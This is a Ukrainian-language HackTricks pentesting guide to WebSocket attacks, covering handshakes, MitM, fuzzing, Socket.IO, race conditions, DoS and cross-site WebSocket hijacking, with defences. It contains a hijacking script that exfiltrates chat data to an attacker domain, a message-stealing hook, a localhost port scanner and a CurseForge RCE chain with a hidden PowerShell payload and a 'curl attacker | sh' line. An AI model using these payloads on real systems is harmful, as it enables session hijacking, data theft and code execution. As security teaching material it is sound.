# Атаки WebSocket

{{#include ../banners/hacktricks-training.md}}

## Що таке WebSockets

З'єднання WebSocket встановлюються через початкове **HTTP** рукостискання і призначені бути **довготривалими**, що дозволяє двосторонню передачу повідомлень у будь-який час без потреби в транзакційній системі. Це робить WebSockets особливо корисними для застосунків, що потребують **низької затримки або сервер-ініційованої комунікації**, таких як потоки фінансових даних у реальному часі.

### Встановлення з'єднань WebSocket

Детальне пояснення щодо встановлення з'єднань WebSocket доступне [**here**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). У підсумку, з'єднання WebSocket зазвичай ініціюються на стороні клієнта за допомогою JavaScript, як показано нижче:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
Протокол `wss` означає WebSocket-з'єднання, захищене за допомогою **TLS**, тоді як `ws` вказує на **незахищене** з'єднання.

Під час встановлення з'єднання між браузером і сервером по HTTP виконується handshake. Процес handshake передбачає відправлення браузером запиту та відповідь сервера, як показано в наступних прикладах:

Браузер надсилає handshake-запит:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Відповідь сервера на handshake:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Після встановлення з'єднання воно залишається відкритим для обміну повідомленнями в обох напрямках.

**Ключові моменти WebSocket Handshake:**

- Заголовки `Connection` і `Upgrade` сигналізують про початок WebSocket handshake.
- Заголовок `Sec-WebSocket-Version` вказує бажану версію протоколу WebSocket, зазвичай `13`.
- У заголовку `Sec-WebSocket-Key` відправляється випадкове значення в Base64, що забезпечує унікальність кожного handshake і допомагає уникнути проблем з кешуючими проксі. Це значення не призначене для аутентифікації, а для підтвердження того, що відповідь не згенерована неправильно налаштованим сервером або кешем.
- Заголовок `Sec-WebSocket-Accept` у відповіді сервера — це хеш від `Sec-WebSocket-Key`, що перевіряє намір сервера відкрити WebSocket-з'єднання.

Ці механізми забезпечують безпечність і надійність процесу handshake, відкриваючи шлях для ефективної комунікації в реальному часі.

### Консоль Linux

Ви можете використовувати `websocat` для встановлення raw-з'єднання з WebSocket.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Або створити сервер websocat:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket підключення

Якщо ви виявите, що клієнти підключені до **HTTP websocket** з вашої поточної локальної мережі, ви можете спробувати [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing)щоб виконати MitM attack між клієнтом та сервером.\
Як тільки клієнт намагатиметься підключитися до вас, ви можете використовувати:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Перерахування Websockets

Ви можете використовувати **інструмент** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **щоб автоматично виявляти, fingerprint-ити та шукати відомі** **вразливості** у websockets.

### Websocket Debug tools

- **Burp Suite** підтримує MitM websockets-комунікацію дуже подібним способом до звичайної HTTP-комунікації.
- The [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite extension** дозволить вам краще керувати Websocket-комунікаціями в Burp, отримуючи **history**, встановлюючи **interception rules**, використовуючи правила **match and replace**, а також використовуючи **Intruder** і **AutoRepeater.**
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** Скорочено від "**WebSocket/Socket.io Proxy**", цей інструмент, написаний на Node.js, надає інтерфейс для **capture, intercept, send custom** повідомлень та перегляду всіх WebSocket і Socket.IO комунікацій між клієнтом і сервером.
- [**wsrepl**](https://github.com/doyensec/wsrepl) — це **interactive websocket REPL**, спеціально розроблений для тестування на проникнення. Він надає інтерфейс для спостереження **incoming websocket messages and sending new ones**, з простим у використанні фреймворком для **automating** цієї комунікації.
- [**https://websocketking.com/**](https://websocketking.com/) — це веб-інструмент для спілкування з іншими вебами з використанням **websockets**.
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) — серед інших типів комунікацій/протоколів, надає веб-інтерфейс для спілкування з іншими вебами за допомогою **websockets.**

## Decrypting Websocket

- [https://github.com/Anof-cyber/PyCript](https://github.com/Anof-cyber/PyCript)
- [https://github.com/Anof-cyber/PyCript-WebSocket/](https://github.com/Anof-cyber/PyCript-WebSocket/)

## Websocket Lab

У [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) є код для запуску веба з використанням websockets, а в [**this post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) ви знайдете пояснення.

## Websocket Fuzzing

Розширення burp [**Backslash Powered Scanner**](https://github.com/PortSwigger/backslash-powered-scanner) тепер дозволяє також fuzz-увати WebSocket-повідомлення. Більше інформації можна прочитати [**here**](https://arete06.com/posts/fuzzing-ws/#adding-websocket-support-to-backslash-powered-scanner).

### WebSocket Turbo Intruder (Burp extension)

WebSocket Turbo Intruder від PortSwigger додає Turbo Intruder–стиль Python-скриптування та high‑rate fuzzing для WebSockets. Встановіть його з BApp Store або зі джерел. Він включає два компоненти:

- Turbo Intruder: відправка великого обсягу повідомлень на один WS endpoint з використанням кастомних движків.
- HTTP Middleware: відкриває локальний HTTP endpoint, який пересилає тіла як WS-повідомлення по персистентному з'єднанню, тож будь-який HTTP‑based scanner може перевіряти WS backends.

Базовий шаблон скрипта для fuzzing WS endpoint та фільтрації релевантних відповідей:
```python
def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(upgrade_request)
for i in range(10):
connection.queue(message, str(i))

def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@MatchRegex(r'{\"user\":\"Hal Pline\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Використовуйте декоратори на кшталт `@MatchRegex(...)`, щоб зменшити шум, коли одне повідомлення викликає кілька відповідей.

### Міст WS за HTTP (HTTP Middleware)

Оберніть постійне WS-з'єднання і пересилайте HTTP-тіла як WS-повідомлення для автоматизованого тестування за допомогою HTTP-сканерів:
```python
def create_connection(upgrade_request):
connection = websocket_connection.create(upgrade_request)
return connection

@MatchRegex(r'{\"user\":\"You\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Потім відправте HTTP локально; тіло пересилається як WS-повідомлення:
```http
POST /proxy?url=https%3A%2F%2Ftarget/ws HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 16

{"message":"hi"}
```
Це дозволяє керувати WS backends, одночасно фільтруючи «цікаві» події (наприклад, SQLi errors, auth bypass, command injection behavior).

### Обробка Socket.IO (handshake, heartbeats, events)

Socket.IO додає власне фреймування поверх WS. Виявляйте це через обов'язковий параметр запиту `EIO` (наприклад, `EIO=4`). Підтримуйте сесію живою за допомогою Ping (`2`) і Pong (`3`) і починайте розмову з `"40"`, потім надсилайте події типу `42["message","hello"]`.

Приклад Intruder:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.queue('42["message","hello"]')

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
HTTP-адаптер (варіант):
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def create_connection(upgrade_request):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.decIn()
return connection

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
### Виявлення prototype pollution на стороні сервера через Socket.IO

Дотримуючись безпечної методики виявлення PortSwigger, спробуйте спричинити prototype pollution у внутрішніх елементах Express, відправивши payload, наприклад:
```json
{"__proto__":{"initialPacket":"Polluted"}}
```
Якщо привітання або поведінка змінилися (наприклад, echo містить "Polluted"), ймовірно ви спричинили server-side prototype pollution. Наслідки залежать від доступних sinks; зіставте з gadgets у розділі Node.js prototype pollution. Див.:

- Check [NodeJS – __proto__ & prototype Pollution](deserialization/nodejs-proto-prototype-pollution/README.md) for sinks/gadgets and chaining ideas.

### WebSocket race conditions with Turbo Intruder

За замовчуванням движок групує повідомлення в одному зʼєднанні (висока пропускна здатність, погано для race conditions). Використовуйте THREADED engine, щоб створювати кілька WS-зʼєднань і відправляти payloads паралельно для виклику логічних змагань (double‑spend, token reuse, state desync). Почніть із прикладного скрипта і налаштуйте concurrency у `config()`.

- Learn methodology and alternatives in [Race Condition](race-condition.md) (see “RC in WebSockets”).

### WebSocket DoS: malformed frame “Ping of Death”

Сконструюйте WS-фрейми, хедер яких оголошує величезну довжину payload, але тіло не надсилається. Деякі WS-сервери довіряють довжині і попередньо виділяють буфери; встановлення значення близько до `Integer.MAX_VALUE` може спричинити Out‑Of‑Memory і віддалений unauth DoS. Див. прикладний скрипт.

### CLI and debugging

- Headless fuzzing: `java -jar WebSocketFuzzer-<version>.jar <scriptFile> <requestFile> <endpoint> <baseInput>`
- Enable the WS Logger to capture and correlate messages using internal IDs.
- Use `inc*`/`dec*` helpers on `Connection` to tweak message ID handling in complex adapters.
- Decorators like `@PingPong`/`@Pong` and helpers like `isInteresting()` reduce noise and keep sessions alive.

### Operational safety

Високошвидкісне WS fuzzing може відкривати багато зʼєднань і відправляти тисячі повідомлень на секунду. Неправильні фрейми та високі швидкості можуть спричинити реальний DoS. Використовуйте лише за наявності дозволу.

## Cross-site WebSocket hijacking (CSWSH)

Cross-site WebSocket hijacking, також відоме як cross-origin WebSocket hijacking, розглядається як окремий випадок [Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md), що впливає на WebSocket-handshakes. Ця вразливість виникає, коли WebSocket-handshakes аутентифікуються виключно через HTTP cookies без CSRF tokens або подібних заходів безпеки.

Атакуючі можуть експлуатувати це, розміщуючи malicious web page, яка ініціює cross-site WebSocket-зʼєднання до вразливого додатку. Відповідно, це зʼєднання обробляється як частина сесії жертви в додатку, що використовує відсутність CSRF-захисту в механізмі обробки сесій.

Для здійснення цієї атаки потрібні такі умови:

- The websocket authentication must be cookie based
- Cookie має бути доступною з сервера атакуючого (зазвичай це означає **`SameSite=None`**) і не повинно бути включено **Firefox Total Cookie Protection** у Firefox та не повинно бути **blocked third-party cookies** у Chrome.
- The websocket server must not check the origin of the connection (or this must be bypasseable)

Також:

- Якщо аутентифікація базується на локальному зʼєднанні (до localhost або локальної мережі), атака **буде можлива**, оскільки наразі немає захисту, що це забороняє (check [more info here](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/))

### Simple Attack

Зверніть увагу, що при встановленні websocket-зʼєднання cookie відправляється на сервер. Сервер може використовувати його, щоб співвіднести кожного конкретного user з його websocket session на основі надісланого cookie.

Отже, якщо, наприклад, websocket server повертає історію розмови користувача, якщо отримує повідомлення з "READY", то простий XSS, який встановлює зʼєднання (cookie буде надіслано автоматично для авторизації жертви), і відправляє "READY", зможе отримати історію розмови.
```html
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie з іншим субдоменом

У цій статті [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) зловмиснику вдалося **execute arbitrary Javascript in a subdomain** того домену, де відбувалася websocket communication. Оскільки це був **subdomain**, **cookie** було **sent**, і оскільки **Websocket didn't check the Origin properly**, було можливо взаємодіяти з ним і **steal tokens from it**.

### Викрадення даних користувача

Скопіюйте веб-додаток, який ви хочете імітувати (наприклад файли .html) і всередині скрипта, де відбувається websocket communication, додайте цей код:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
Тепер завантажте файл `wsHook.js` з [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) і **збережіть його всередині папки з веб-файлами**.\
Опублікувавши веб-застосунок і змусивши користувача підключитися до нього, ви зможете вкрасти відправлені та отримані повідомлення через websocket:
```javascript
sudo python3 -m http.server 80
```
### Захист від CSWSH

Атака CSWSH ґрунтується на тому, що **користувач перейде на шкідливу сторінку**, яка **відкриє websocket-з'єднання** зі сторінкою, до якої користувач уже підключений, і аутентифікується як він, оскільки запит відправляє cookies користувача.

Наразі дуже просто запобігти цій проблемі:

- **Websocket server checking the origin**: Сервер websocket завжди має перевіряти, звідки надходить підключення (Origin), щоб запобігти підключенню небажаних сторінок.
- **Authentication token**: Замість базувати автентифікацію на cookie, websocket-з'єднання може базуватися на token, який генерується сервером для користувача і невідомий атакуючому (наприклад, як anti-CSRF token).
- **SameSite Cookie attribute**: Cookies зі значенням `SameSite` рівним `Lax` або `Strict` не будуть відправлені зі сторінки зовнішнього атакуючого на сервер жертви, отже автентифікація на основі cookie не буде успішною. Зверніть увагу, що Chrome зараз ставить значення **`Lax`** для cookie, у яких цей прапорець не вказаний, роблячи це більш безпечним за замовчуванням. Проте протягом перших 2 хвилин після створення cookie воно матиме значення **`None`**, що робить його вразливим у цей обмежений період (очікується, що цей захід буде в майбутньому видалено).
- **Firefox Total Cookie Protection**: Total Cookie Protection працює шляхом ізоляції cookies до сайту, на якому вони створені. По суті кожен сайт має власний розділ збереження cookie, щоб запобігти зв'язуванню історії переглядів користувача третіми сторонами. Це робить **CSWSH непридатним**, оскільки сайт атакуючого не матиме доступу до cookies.
- **Chrome third-party cookies block**: Це також може запобігти відправленню cookie автентифікованого користувача на websocket сервер навіть з `SameSite=None`.

### Localhost WebSocket abuse & browser port discovery

Десктопні лаунчери часто запускають помічників (наприклад, CurseForge's `CurseAgent.exe`), які відкривають JSON-RPC WebSockets на `127.0.0.1:<random_port>`. Браузер **не застосовує SOP до loopback-сокетів**, тому будь-яка веб-сторінка може спробувати handshake. Якщо агент приймає довільні значення `Origin` і пропускає вторинну автентифікацію, IPC-поверхня стає віддалено керованою прямо з JavaScript.

#### Перерахування відкритих методів

Захопіть легітимну сесію, щоб вивчити контракт протоколу. Наприклад, CurseForge надсилає фрейми на кшталт `{"type":"method","name":"minecraftTaskLaunchInstance","args":[{...}]}`, де `name` — RPC метод, а `args` містить структуровані об'єкти (GUIDs, resolution, flags тощо). Коли ця структура відома, ви можете викликати методи на кшталт `createModpack`, `minecraftGetDefaultLocation` або будь-яку іншу привілейовану задачу безпосередньо з інжектованої сторінки.

#### Виявлення портів з браузера

Оскільки помічник прив'язується до випадкового високого порту, експлойт спочатку brute-forces localhost через WebSockets. Chromium-based browsers витримують приблизно ~16k невдалих upgrade-ів перед тим, як почнуть throttling, що достатньо, щоб перебрати ephemeral range; Firefox, як правило, падає або зависає після кількох сотень невдач, тому практичні PoCs часто націлені на Chromium.

<details>
<summary>Мінімальний сканер браузера</summary>
```javascript
async function findLocalWs(start = 20000, end = 36000) {
for (let port = start; port <= end; port++) {
await new Promise((resolve) => {
const ws = new WebSocket(`ws://127.0.0.1:${port}/`);
let settled = false;
const finish = () => { if (!settled) { settled = true; resolve(); } };
ws.onerror = ws.onclose = finish;
ws.onopen = () => {
console.log(`Found candidate on ${port}`);
ws.close();
finish();
};
});
}
}
```
</details>

Коли з'єднання проходить handshake і повертає дані, специфічні для протоколу, повторно використовуйте цей socket для RPC-ланцюга.

#### Ланцюжок методів JSON-RPC у RCE

CurseForge exploit поєднує два неавтентифіковані виклики:

1. `createModpack` → повертає новий `MinecraftInstanceGuid` без взаємодії з користувачем.
2. `minecraftTaskLaunchInstance` → запускає цей GUID, приймаючи довільні JVM-флаги через `AdditionalJavaArguments`.

Діагностичні опції JNI/JVM забезпечують готовий RCE-примітив. Наприклад, обмежте metaspace, щоб спричинити збій, і використайте error hook для виконання команд:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand ..."
```
На Unix-цілях просто замініть payload на `/bin/sh -c 'curl https://attacker/p.sh | sh'`. Це працює навіть коли ви не можете торкнутися коду застосунку — достатньо контролювати JVM CLI.

This “create resource → privileged launch” pattern appears often in updaters and launchers. Any time method (1) yields a server-tracked identifier and method (2) executes code or spawns a process with that identifier, check whether user-controlled arguments can be injected.


## Race Conditions

Race Conditions in WebSockets are also a thing, [check this information to learn more](race-condition.md#rc-in-websockets).

## Інші вразливості

Оскільки Web Sockets є механізмом для **send data to server side and client side**, залежно від того, як сервер і клієнт обробляють інформацію, **Web Sockets можуть бути використані для експлуатації інших вразливостей, таких як XSS, SQLi або будь-яких інших common web vuln, використовуючи введення користувача з websocket.**

## **WebSocket Smuggling**

Ця вразливість може дозволити вам **bypass reverse proxies restrictions**, змусивши їх повірити, що **websocket communication was stablished** (навіть якщо це не так). Це може дозволити атакуючому **access hidden endpoints**. Для отримання додаткової інформації перегляньте наступну сторінку:


{{#ref}}
h2c-smuggling.md
{{#endref}}

## References

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)
- [https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocket Turbo Intruder – BApp Store](https://portswigger.net/bappstore/ba292c5982ea426c95c9d7325d9a1066)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [Turbo Intruder background](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
- [Server-side prototype pollution – safe detection methods](https://portswigger.net/research/server-side-prototype-pollution#safe-detection-methods-for-manual-testers)
- [WS RaceCondition PoC (Java)](https://github.com/redrays-io/WS_RaceCondition_PoC)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [PingOfDeathExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/PingOfDeathExample.py)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)

{{#include ../banners/hacktricks-training.md}}
